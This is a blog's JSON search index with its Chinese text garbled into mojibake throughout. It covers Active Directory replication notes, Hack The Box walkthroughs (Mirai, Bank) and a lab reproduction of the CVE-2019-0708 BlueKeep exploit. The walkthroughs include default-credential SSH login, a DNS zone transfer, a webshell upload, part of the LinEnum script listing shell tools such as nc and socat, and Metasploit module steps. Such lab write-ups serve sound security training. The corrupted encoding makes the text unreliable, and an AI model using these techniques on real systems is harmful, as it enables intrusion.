å½“æ›´æ–°æ•°æ®å¾ˆé‡è¦æ—¶(å¦‚ç”¨æˆ·è´¦æˆ·é”å®šï¼Œå¯†ç å˜åŠ¨ï¼Œç­–ç•¥å˜åŠ¨ç­‰)ï¼Œä¸ä¼šç­‰å¾… 15 ç§’çš„å»¶è¿Ÿå†å‘é€šçŸ¥ï¼Œè€Œæ˜¯ç”¨å•ä¸»å¤åˆ¶æ¨¡å¼çš„ã€Œç´§æ€¥é€šçŸ¥ã€çš„æ–¹å¼ï¼Œç«‹å³é€šçŸ¥å¤åˆ¶ä¼™ä¼´ å³ä½¿æ²¡æœ‰æ•°æ®æ›´æ–°ï¼Œç«™ç‚¹å†… DC ä¹Ÿä¼šæ¯éš”ä¸€å®šæ—¶é—´è¿›è¡Œæ•°æ®åŒæ­¥(é»˜è®¤ 1 å°æ—¶ï¼Œå¯é…ç½®è°ƒæ•´)ï¼Œä¹Ÿå¯éšæ—¶æ‰‹å·¥è§¦å‘ç«‹å³å¤åˆ¶ ","date":"2019-10-09","objectID":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/:27:0","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"AD æ´»åŠ¨ç›®å½•ç®¡ç†","uri":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"è¿‡ç¨‹ ç«™ç‚¹é—´ DC çš„æ•°æ®å¤åˆ¶æœºåˆ¶ä¸ä¼šä¸€æœ‰å˜åŒ–å°±ç«‹å³è§¦å‘é€šçŸ¥ï¼Œè€Œæ˜¯æŒ‰æŒ‡å®šé¢‘ç‡å®šæ—¶å¤åˆ¶(é»˜è®¤å°æ—¶),ä¸”å¿…é¡»åœ¨å¤åˆ¶è®¡åˆ’å…è®¸çš„æ—¶é—´çª—å£å†…(æ¯”å¦‚ä¸‹ç­ä»¥å);ä¹Ÿå¯åœ¨å¿…è¦æ—¶ç”±ç®¡ç†å‘˜æ‰‹å·¥è§¦å‘ç«‹å³æ›´æ–° æ¯ä¸€ä¸ªç«™ç‚¹å†…éƒ½æœ‰ä¸€å° DC ä½œä¸ºç«™ç‚¹é—´æ‹“æ‰‘ç”Ÿæˆå™¨(ISTG)ï¼Œè´Ÿè´£è®¡ç®—è¯¥ç«™ç‚¹å’Œå…¶ä»–ç«™ç‚¹ä¹‹é—´çš„æœ€ä½³å¤åˆ¶è·¯å¾„ ITSG åŒæ—¶æŒ‡å®šç«™ç‚¹å†…çš„ä¸€å° DC ä¸ºæ¡¥å¤´å ¡æœåŠ¡å™¨(Bridgehead)ï¼Œè´Ÿè´£åŸŸé—´æ•°æ®å¤åˆ¶çš„å‡ºå…¥å£è·³æ¿ã€‚ç«™ç‚¹å†…çš„ DC å°†å¤åˆ¶æ›´æ–°ç»Ÿä¸€äº¤ç»™ Bridgeheadï¼Œç”±å…¶è´Ÿè´£å’Œå…¶ä»–ç«™ç‚¹çš„ Bridgehead é€šä¿¡å¤åˆ¶ç«™ç‚¹é—´æ•°æ®ï¼Œå†è¿›ä¸€æ­¥å¤åˆ¶ç»™å¯¹æ–¹ç«™ç‚¹å†…çš„å…¶ä»– DCã€‚ ","date":"2019-10-09","objectID":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/:27:1","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"AD æ´»åŠ¨ç›®å½•ç®¡ç†","uri":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"ç«™ç‚¹é“¾æ¥ ç«™ç‚¹å’Œç«™ç‚¹ä¹‹é—´å¤åˆ¶çš„é€»è¾‘é€šé“ï¼Œå»ºç«‹ç«™ç‚¹é“¾æ¥éœ€ç¡®ä¿ DC é—´çš„ IP å¯è¾¾ è®¾ç½®ç«™ç‚¹é“¾æ¥çš„å¼€é”€(Cost)å°†å½±å“è·¯å¾„çš„é€‰æ‹©ï¼Œé»˜è®¤çš„å¼€é”€ä¸º100ï¼Œè¶Šå°è¶Šä¼˜å…ˆ ","date":"2019-10-09","objectID":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/:27:2","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"AD æ´»åŠ¨ç›®å½•ç®¡ç†","uri":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"ç«™ç‚¹ä¸ç»„ç­–ç•¥ éƒ¨ç½²ç«™ç‚¹åå¯ä»¥å°†ç»„ç­–ç•¥çš„åº”ç”¨èŒƒå›´é…ç½®ä¸ºå¯¹ç«™ç‚¹å†…å¯¹è±¡ç”Ÿæ•ˆ ","date":"2019-10-09","objectID":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/:27:3","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"AD æ´»åŠ¨ç›®å½•ç®¡ç†","uri":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"å¤åˆ¶çš„ç›‘è§†å’Œæ’é”™ ","date":"2019-10-09","objectID":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/:27:4","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"AD æ´»åŠ¨ç›®å½•ç®¡ç†","uri":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/"},{"categories":["é¶åœº"],"content":"Hack The Boxé¶åœºç»ƒä¹ è®°å½•","date":"2019-09-11","objectID":"/2019/09/hacktheboxmirai/","tags":["HTBé¶åœº"],"title":"Hack The Box â€”â€” Mirai","uri":"/2019/09/hacktheboxmirai/"},{"categories":["é¶åœº"],"content":"Hack The Box â€”â€” Mirai ","date":"2019-09-11","objectID":"/2019/09/hacktheboxmirai/:0:0","tags":["HTBé¶åœº"],"title":"Hack The Box â€”â€” Mirai","uri":"/2019/09/hacktheboxmirai/"},{"categories":["é¶åœº"],"content":"ä¿¡æ¯æœé›† ","date":"2019-09-11","objectID":"/2019/09/hacktheboxmirai/:1:0","tags":["HTBé¶åœº"],"title":"Hack The Box â€”â€” Mirai","uri":"/2019/09/hacktheboxmirai/"},{"categories":["é¶åœº"],"content":"nmap nmap -T4 -A -v 10.10.10.48 å¾—åˆ°ï¼š æœåŠ¡å™¨å¼€æ”¾äº† TCP 53ã€80ã€22ç«¯å£ã€‚ è®¿é—® 80 ç«¯å£ï¼Œä¸ºç©ºç™½é¡µé¢ã€‚ ","date":"2019-09-11","objectID":"/2019/09/hacktheboxmirai/:1:1","tags":["HTBé¶åœº"],"title":"Hack The Box â€”â€” Mirai","uri":"/2019/09/hacktheboxmirai/"},{"categories":["é¶åœº"],"content":"ç›®å½•çˆ†ç ´ python3 dirsearch.py -u http://10.10.10.48/ -e html -t 20 å¾—åˆ°ï¼š å‘ç° admin ç›®å½•ã€‚ è®¿é—®ï¼Œå¾—åˆ°ï¼š æœç´¢ç›¸å…³ä¿¡æ¯ï¼Œå‘ç°æ˜¯ä¸€ä¸ªæ ‘è“æ´¾ä¸Šæ­å»ºçš„æœåŠ¡ ","date":"2019-09-11","objectID":"/2019/09/hacktheboxmirai/:1:2","tags":["HTBé¶åœº"],"title":"Hack The Box â€”â€” Mirai","uri":"/2019/09/hacktheboxmirai/"},{"categories":["é¶åœº"],"content":"æ¼æ´åˆ©ç”¨ å°è¯•ä½¿ç”¨æ ‘è“æ´¾é»˜è®¤å¯†ç ç™»å½•ï¼Œæœç´¢ç›¸å…³ä¿¡æ¯ï¼Œå‘ç°æ ‘è“æ´¾é»˜è®¤å¯†ç å¦‚ä¸‹ï¼š å°è¯•ç™»å½•ï¼š ssh pi@10.10.10.48 å‘ç°ç™»å½•æˆåŠŸï¼š ç›´æ¥ cat /home/pi/user.txt è·å¾—ç¬¬ä¸€ä¸ª flagã€‚ åˆ©ç”¨ sudo -l å‘½ä»¤ï¼ŒæŸ¥çœ‹å½“å‰å¯æ‰§è¡Œ sudo çš„æƒé™ï¼š å‘ç°æ— éœ€å¯†ç å¯æ‰§è¡Œ root çš„æ‰€æœ‰å‘½ä»¤ï¼Œç›´æ¥ sudo su åˆ‡æ¢åˆ° root ç”¨æˆ·ã€‚ ç›´æ¥ cat /root/root.txt å‘ç°å¦‚ä¸‹ä¿¡æ¯ï¼š å°è¯•æŸ¥çœ‹å½“å‰ç³»ç»ŸæŒ‚è½½äº†å“ªäº›è®¾å¤‡ï¼š df -lh å‘ç° /dev/sdb è®¾å¤‡æŒ‚è½½åœ¨ /media/stick ä¸‹ï¼š ","date":"2019-09-11","objectID":"/2019/09/hacktheboxmirai/:2:0","tags":["HTBé¶åœº"],"title":"Hack The Box â€”â€” Mirai","uri":"/2019/09/hacktheboxmirai/"},{"categories":["é¶åœº"],"content":"æ–¹æ³•ä¸€ ç›´æ¥åˆ©ç”¨ strings å‘½ä»¤è·å–è®¾å¤‡ä¸­çš„æ‰€æœ‰å­—ç¬¦ä¸²ï¼š strings /dev/sdb å¾—åˆ°ç–‘ä¼¼ flag çš„å­—ç¬¦ä¸²ï¼Œæäº¤åå‘ç°æ­£ç¡®ã€‚ ","date":"2019-09-11","objectID":"/2019/09/hacktheboxmirai/:2:1","tags":["HTBé¶åœº"],"title":"Hack The Box â€”â€” Mirai","uri":"/2019/09/hacktheboxmirai/"},{"categories":["é¶åœº"],"content":"æ–¹æ³•äºŒ ä½¿ç”¨ dd å‘½ä»¤æå– usb é•œåƒ: dcfldd if=/dev/sdb of=/home/pi/usb.ddâ€‹ ç„¶åï¼Œåˆ†æé•œåƒå†…å®¹ï¼š binwalk usb.ddâ€‹ å‘ç°å­˜åœ¨ä¸‰ä¸ªæ–‡ä»¶ã€‚ä½¿ç”¨ binwalk æå–æ–‡ä»¶ï¼š binwalk -Me usb.ddâ€‹ æŸ¥çœ‹åŸå§‹æ–‡ä»¶ï¼Œå¾—åˆ° flag ","date":"2019-09-11","objectID":"/2019/09/hacktheboxmirai/:2:2","tags":["HTBé¶åœº"],"title":"Hack The Box â€”â€” Mirai","uri":"/2019/09/hacktheboxmirai/"},{"categories":["é¶åœº"],"content":"Hack The Boxé¶åœºç»ƒä¹ è®°å½•","date":"2019-09-09","objectID":"/2019/09/hacktheboxbank/","tags":["HTBé¶åœº"],"title":"Hack The Box â€”â€” Bank","uri":"/2019/09/hacktheboxbank/"},{"categories":["é¶åœº"],"content":"Hack The Box â€”â€” Bank ","date":"2019-09-09","objectID":"/2019/09/hacktheboxbank/:0:0","tags":["HTBé¶åœº"],"title":"Hack The Box â€”â€” Bank","uri":"/2019/09/hacktheboxbank/"},{"categories":["é¶åœº"],"content":"ä¿¡æ¯æœé›† ","date":"2019-09-09","objectID":"/2019/09/hacktheboxbank/:1:0","tags":["HTBé¶åœº"],"title":"Hack The Box â€”â€” Bank","uri":"/2019/09/hacktheboxbank/"},{"categories":["é¶åœº"],"content":"nmap nmap -T4 -A -v 10.10.10.29 å‘ç°å¼€æ”¾äº†22ã€80ã€TCP 53 ç«¯å£ï¼Œåœ¨ 53 ç«¯å£ä¸Šå¼€æ”¾ DNS æœåŠ¡ã€‚é€šå¸¸æƒ…å†µä¸‹ DNS æœåŠ¡å¼€æ”¾åœ¨ UDP 53 ç«¯å£ä¸Šï¼Œåœ¨ TCP ä¸Šå¼€æ”¾ DNS æœåŠ¡ï¼Œä¸€èˆ¬æ˜¯å…·æœ‰åŒºåŸŸä¼ è¾“åŠŸèƒ½ï¼Œå› æ­¤æ€€ç–‘å…·æœ‰ DNS åŒºåŸŸä¼ è¾“æ¼æ´ã€‚ è®¿é—® 80 ç«¯å£ï¼Œæ˜¯ä¸€ä¸ª apache çš„é»˜è®¤é¡µé¢ï¼Œé€šå¸¸æƒ…å†µä¸‹ï¼Œè¿™ç§æ—¢å¼€ç€ DNS çš„ï¼Œç„¶åç›´æ¥è®¿é—® 80 ç«¯å£ä¸ºç©ºé¡µé¢çš„æœåŠ¡å™¨ï¼Œæ˜¯ä½œä¸ºè™šæ‹Ÿä¸»æœºä½¿ç”¨ã€‚ ","date":"2019-09-09","objectID":"/2019/09/hacktheboxbank/:1:1","tags":["HTBé¶åœº"],"title":"Hack The Box â€”â€” Bank","uri":"/2019/09/hacktheboxbank/"},{"categories":["é¶åœº"],"content":"DNS ä¿¡æ¯æŸ¥è¯¢ é¦–å…ˆæµ‹è¯• localhost ä¸ 10.10.10.29ï¼Œå¹¶æœªå‘ç°æœ‰ä»·å€¼çš„ä¿¡æ¯ï¼Œç„¶åå°è¯•çŒœæµ‹ bank.htb ï¼ˆçœ‹äº† WP æ‰çŸ¥é“ï¼‰ï¼Œå‘ç°è¯¥åŸŸåèƒ½å¤Ÿè¢« DNS æœåŠ¡æ‰€è§£æï¼Œå› æ­¤åˆ©ç”¨ dig å·¥å…·è¿›è¡Œè¿›ä¸€æ­¥æµ‹è¯•ã€‚ dig axfr bank.htb @10.10.10.29 æˆåŠŸåˆ©ç”¨åŒºåŸŸä¼ è¾“æ¼æ´è·å¾— bank.htb åŸŸåçš„å­åŸŸåã€‚ ","date":"2019-09-09","objectID":"/2019/09/hacktheboxbank/:1:2","tags":["HTBé¶åœº"],"title":"Hack The Box â€”â€” Bank","uri":"/2019/09/hacktheboxbank/"},{"categories":["é¶åœº"],"content":"æ¼æ´å‘æ˜ å°†æ”»å‡»æœºçš„ DNS æœåŠ¡å™¨è®¾ç½®ä¸º 10.10.10.29ï¼Œç„¶åè®¿é—® www.bank.htbï¼Œå¾—åˆ°ï¼š ç„¶ååˆ©ç”¨ dirsearch å·¥å…·è¿›è¡Œç›®å½•çˆ†ç ´ï¼š å‘ç°ä¸Šä¼ ç›®å½•ã€index.phpã€support.phpï¼Œä½†æ˜¯index.phpã€support.phpé¡µé¢å¤§å°ä¸åŒï¼Œå´ç›´æ¥ 302 é‡å®šå‘åˆ°login.phpï¼Œæ€€ç–‘index.phpã€support.php å¦æœ‰ç„æœºã€‚ åˆ©ç”¨ burpsuite çš„é‡å†™ response header çš„åŠŸèƒ½ï¼Œå–æ¶ˆé‡å®šå‘ï¼Œå³å°† 302 æ”¹ä¸º 200ã€‚ è®¿é—®å¾—åˆ°index.phpã€support.phpï¼š support.php å­˜åœ¨ä¸Šä¼ ç‚¹ï¼Œä½†æ˜¯ç»è¿‡å°è¯•ï¼Œå¹¶æœªç»•è¿‡é™åˆ¶ï¼Œè¿›è€Œè¿›ä¸€æ­¥è¿›è¡Œæµ‹è¯•ã€‚ åœ¨ç›®å½•çˆ†ç ´çš„è¿‡ç¨‹ä¸­ï¼Œå‘ç°äº† balance-transfer ç›®å½•ï¼Œè®¿é—®åå¾—åˆ°ï¼š éšä¾¿æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶ï¼Œå‘ç°é‡Œé¢ç–‘ä¼¼æ˜¯åŠ å¯†è¿‡çš„æ—¥å¿—ï¼Œå› æ­¤å°è¯•å¯»æ‰¾åŠ å¯†å¤±è´¥çš„æ–‡ä»¶ï¼Œè¿›è€Œè·å¾—ç”¨æˆ·åå’Œå¯†ç çš„æ˜æ–‡ã€‚ é¦–å…ˆå°†æ‰€æœ‰æ–‡ä»¶ä¸‹è½½åˆ°æœ¬åœ°ï¼š wget -r http://www.bank.htb/balance-transfer ç„¶åè¿›å…¥åˆ° balance-transfer ç›®å½•ï¼Œåˆ é™¤index.html* ç­‰æ–‡ä»¶ï¼Œè¿›è¡Œå¤§å°æ’åºï¼š wc -c *.acc | sort -n å‘ç°ä¸€ä¸ªç‰¹åˆ«å°çš„æ–‡ä»¶ï¼Œè®¿é—®åå¾—åˆ°ï¼š åˆ©ç”¨å¾—åˆ°çš„è´¦å·å’Œå¯†ç ç™»å½•ï¼š å†æ¬¡å‘ç°ä¸Šä¼ é¡µé¢ï¼ŒåŒæ—¶ï¼Œè¯¥ä¸Šä¼ é¡µé¢åˆ©ç”¨çš„æ˜¯ä¹‹å‰çš„ support.phpã€‚ å³é”®æŸ¥çœ‹å½“å‰é¡µé¢çš„æºä»£ç ï¼Œå‘ç°ä¸€å¤„ debug ç•™ä¸‹çš„æ¼æ´ï¼š ç›´æ¥ä¸Šä¼ webshellï¼Œå‘½åä¸º xxx.htbï¼Œèœåˆ€è¿æ¥ï¼š æŸ¥çœ‹ user.txt è·å¾—ç¬¬ä¸€ä¸ª flagã€‚ whoami æŸ¥çœ‹æƒé™ï¼Œå‘ç°æƒé™ä¸è¶³ï¼Œå°è¯•ææƒã€‚ ä¸Šä¼  LinEnum.sh è„šæœ¬ï¼Œå¹¶æ‰§è¡Œï¼Œè·å¾—ä¸€äº›è¾…åŠ©ä¿¡æ¯ã€‚ #!/bin/bash #A script to enumerate local information from a Linux host version=\"version 0.97\" #@rebootuser #help function usage () { echo -e \"\\n\\e[00;31m#########################################################\\e[00m\" echo -e \"\\e[00;31m#\\e[00m\" \"\\e[00;33mLocal Linux Enumeration \u0026 Privilege Escalation Script\\e[00m\" \"\\e[00;31m#\\e[00m\" echo -e \"\\e[00;31m#########################################################\\e[00m\" echo -e \"\\e[00;33m# www.rebootuser.com | @rebootuser \\e[00m\" echo -e \"\\e[00;33m# $version\\e[00m\\n\" echo -e \"\\e[00;33m# Example: ./LinEnum.sh -k keyword -r report -e /tmp/ -t \\e[00m\\n\" echo \"OPTIONS:\" echo \"-k Enter keyword\" echo \"-e Enter export location\" echo \"-s Supply user password for sudo checks (INSECURE)\" echo \"-t Include thorough (lengthy) tests\" echo \"-r Enter report name\" echo \"-h Displays this help text\" echo -e \"\\n\" echo \"Running with no options = limited scans/no output file\" echo -e \"\\e[00;31m#########################################################\\e[00m\" } header() { echo -e \"\\n\\e[00;31m#########################################################\\e[00m\" echo -e \"\\e[00;31m#\\e[00m\" \"\\e[00;33mLocal Linux Enumeration \u0026 Privilege Escalation Script\\e[00m\" \"\\e[00;31m#\\e[00m\" echo -e \"\\e[00;31m#########################################################\\e[00m\" echo -e \"\\e[00;33m# www.rebootuser.com\\e[00m\" echo -e \"\\e[00;33m# $version\\e[00m\\n\" } debug_info() { echo \"[-] Debug Info\" if [ \"$keyword\" ]; then echo \"[+] Searching for the keyword $keyword in conf, php, ini and log files\" fi if [ \"$report\" ]; then echo \"[+] Report name = $report\" fi if [ \"$export\" ]; then echo \"[+] Export location = $export\" fi if [ \"$thorough\" ]; then echo \"[+] Thorough tests = Enabled\" else echo -e \"\\e[00;33m[+] Thorough tests = Disabled\\e[00m\" fi sleep 2 if [ \"$export\" ]; then mkdir $export 2\u003e/dev/null format=$export/LinEnum-export-`date +\"%d-%m-%y\"` mkdir $format 2\u003e/dev/null fi if [ \"$sudopass\" ]; then echo -e \"\\e[00;35m[+] Please enter password - INSECURE - really only for CTF use!\\e[00m\" read -s userpassword echo fi who=`whoami` 2\u003e/dev/null echo -e \"\\n\" echo -e \"\\e[00;33mScan started at:\"; date echo -e \"\\e[00m\\n\" } # useful binaries (thanks to https://gtfobins.github.io/) binarylist='nmap\\|perl\\|awk\\|find\\|bash\\|sh\\|man\\|more\\|less\\|vi\\|emacs\\|vim\\|nc\\|netcat\\|python\\|ruby\\|lua\\|irb\\|tar\\|zip\\|gdb\\|pico\\|scp\\|git\\|rvim\\|script\\|ash\\|csh\\|curl\\|dash\\|ed\\|env\\|expect\\|ftp\\|sftp\\|node\\|php\\|rpm\\|rpmquery\\|socat\\|strace\\|taskset\\|tclsh\\|telnet\\|tftp\\|wget\\|wish\\|zsh\\|ssh$\\|ip$\\|arp\\|mtr' system_info() { echo -e \"\\e[00;33m### SYSTEM ##############################################\\e[00m\" #basic kernel info unameinfo=`uname -a 2\u003e/dev/null` if [ \"$unameinfo\" ]; then echo -e \"\\e[00;31m[-] Kernel information:\\e[00m\\n$unameinfo\" echo -e \"\\n\" fi procver=`cat /proc/version 2\u003e/dev/null` if [ \"$procver\" ]; then echo -e \"\\e[00;31m[-] Kernel information (continued):\\e[00m\\n$procver\" echo -e \"\\n\" fi #search all *-release files for version info release=`cat /etc/*-release 2\u003e/dev/null` if [ \"$release\" ]; then echo -e \"\\e[00;31m[-] Specific release information:\\e[00m\\n$release\" echo -e \"\\n\" fi #target hostname info hostnamed=`hostname 2\u003e/dev/null` if [ \"$hostnamed\" ]; then echo -e \"\\e[00;31m[-] Hostname:\\e[00m\\n","date":"2019-09-09","objectID":"/2019/09/hacktheboxbank/:2:0","tags":["HTBé¶åœº"],"title":"Hack The Box â€”â€” Bank","uri":"/2019/09/hacktheboxbank/"},{"categories":["æ¼æ´å¤ç°"],"content":"CVE-2019-0708 è¿œç¨‹æ¡Œé¢ä»£ç æ‰§è¡Œæ¼æ´å¤ç°","date":"2019-09-07","objectID":"/2019/09/cve-2019-0708%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/","tags":["RDP","æ¼æ´å¤ç°"],"title":"CVE-2019-0708è¿œç¨‹æ¡Œé¢ä»£ç æ‰§è¡Œæ¼æ´å¤ç°","uri":"/2019/09/cve-2019-0708%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["æ¼æ´å¤ç°"],"content":"CVE-2019-0708 è¿œç¨‹æ¡Œé¢ä»£ç æ‰§è¡Œæ¼æ´å¤ç° ","date":"2019-09-07","objectID":"/2019/09/cve-2019-0708%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:0:0","tags":["RDP","æ¼æ´å¤ç°"],"title":"CVE-2019-0708è¿œç¨‹æ¡Œé¢ä»£ç æ‰§è¡Œæ¼æ´å¤ç°","uri":"/2019/09/cve-2019-0708%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["æ¼æ´å¤ç°"],"content":"æ¼æ´ç¯å¢ƒ ç›®æ ‡æœº IP: 172.16.105.129 æ”»å‡»æœº IPï¼š172.16.105.1 åœ¨ mac ä¸‹ä½¿ç”¨ VMware Fusion å®‰è£… Windows7 SP1ï¼Œä¸‹è½½é“¾æ¥å¦‚ä¸‹ï¼š Windows7 SP1 ä¸‹è½½é“¾æ¥: ed2k://|file|cn_windows_7_ultimate_with_sp1_x64_dvd_u_677408.iso|3420557312|B58548681854236C7939003B583A8078|/ æ³¨æ„ï¼š ç”±äºç›®å‰ exp åªæ”¯æŒå¦‚ä¸‹ç‰ˆæœ¬çš„ç³»ç»Ÿï¼Œå› æ­¤å®‰è£…å…¶å®ƒç‰ˆæœ¬çš„ç³»ç»Ÿå¯èƒ½æ— æ³•åˆ©ç”¨ã€‚ æ‰“å¼€ win7 çš„è¿œç¨‹æ¡Œé¢åŠŸèƒ½ï¼š ","date":"2019-09-07","objectID":"/2019/09/cve-2019-0708%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:1:0","tags":["RDP","æ¼æ´å¤ç°"],"title":"CVE-2019-0708è¿œç¨‹æ¡Œé¢ä»£ç æ‰§è¡Œæ¼æ´å¤ç°","uri":"/2019/09/cve-2019-0708%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["æ¼æ´å¤ç°"],"content":"msf ç¯å¢ƒå‡†å¤‡ ä¸‹è½½ https://github.com/rapid7/metasploit-framework/pull/12283/files ä¸­çš„æ”»å‡»å¥—ä»¶æ”¾ç½®æ–‡ä»¶åˆ°msfçš„ç›¸åº”æ–‡ä»¶å¤¹(å¦‚æœå·²å­˜åœ¨åŒåæ–‡ä»¶,ç›´æ¥è¦†ç›–å³å¯) rdp.rb -\u003e /opt/metasploit-framework/embedded/framework/lib/msf/core/exploit/rdp.rb rdp_scanner.rb -\u003e /opt/metasploit-framework/embedded/framework/modules/auxiliary/scanner/rdp/rdp_scanner.rb cve_2019_0708_bluekeep.rb -\u003e /opt/metasploit-framework/embedded/framework/modules/auxiliary/scanner/rdp/cve_2019_0708_bluekeep.rb cve_2019_0708_bluekeep_rce.rb -\u003e /opt/metasploit-framework/embedded/framework/modules/exploits/windows/rdp/cve_2019_0708_bluekeep_rce.rb ","date":"2019-09-07","objectID":"/2019/09/cve-2019-0708%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:2:0","tags":["RDP","æ¼æ´å¤ç°"],"title":"CVE-2019-0708è¿œç¨‹æ¡Œé¢ä»£ç æ‰§è¡Œæ¼æ´å¤ç°","uri":"/2019/09/cve-2019-0708%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["æ¼æ´å¤ç°"],"content":"æ¼æ´åˆ©ç”¨ è¿›å…¥ msfconsole è¿›å…¥ä»¥åä½¿ç”¨ reload_all é‡æ–°åŠ è½½ 0708RDP åˆ©ç”¨æ¨¡å— ä½¿ç”¨ use exploit/windows/rdp/cve_2019_0708_bluekeep_rce å¯ç”¨ 0708RDP æ”»å‡»æ¨¡å— ä½¿ç”¨ show options æŸ¥çœ‹éœ€è¦é…ç½®çš„é€‰é¡¹ï¼š ","date":"2019-09-07","objectID":"/2019/09/cve-2019-0708%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:3:0","tags":["RDP","æ¼æ´å¤ç°"],"title":"CVE-2019-0708è¿œç¨‹æ¡Œé¢ä»£ç æ‰§è¡Œæ¼æ´å¤ç°","uri":"/2019/09/cve-2019-0708%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["æ¼æ´å¤ç°"],"content":"ä½¿ç”¨é»˜è®¤çš„ shell å¡«å†™é…ç½®ä¿¡æ¯ï¼Œå¹¶æ‰§è¡Œæ”»å‡»ï¼š ","date":"2019-09-07","objectID":"/2019/09/cve-2019-0708%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:3:1","tags":["RDP","æ¼æ´å¤ç°"],"title":"CVE-2019-0708è¿œç¨‹æ¡Œé¢ä»£ç æ‰§è¡Œæ¼æ´å¤ç°","uri":"/2019/09/cve-2019-0708%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["æ¼æ´å¤ç°"],"content":"ä½¿ç”¨ meterpreter çš„ shell æ³¨æ„ï¼š è¯·åœ¨ä¸¤æ¬¡æ”»å‡»ä¹‹é—´é‡å¯ç›®æ ‡æœºï¼Œå¦åˆ™ä¼šå‡ºç°æ”»å‡»å¤±è´¥çš„ç°è±¡ï¼ ","date":"2019-09-07","objectID":"/2019/09/cve-2019-0708%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:3:2","tags":["RDP","æ¼æ´å¤ç°"],"title":"CVE-2019-0708è¿œç¨‹æ¡Œé¢ä»£ç æ‰§è¡Œæ¼æ´å¤ç°","uri":"/2019/09/cve-2019-0708%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["é¶åœº"],"content":"Hack The Boxé¶åœºç»ƒä¹ è®°å½•","date":"2019-09-06","objectID":"/2019/09/hacktheboxblocky/","tags":["HTBé¶åœº"],"title":"Hack The Box â€”â€” Blocky","uri":"/2019/09/hacktheboxblocky/"},{"categories":["é¶åœº"],"content":"Hack The Box â€”â€” Blocky ","date":"2019-09-06","objectID":"/2019/09/hacktheboxblocky/:0:0","tags":["HTBé¶åœº"],"title":"Hack The Box â€”â€” 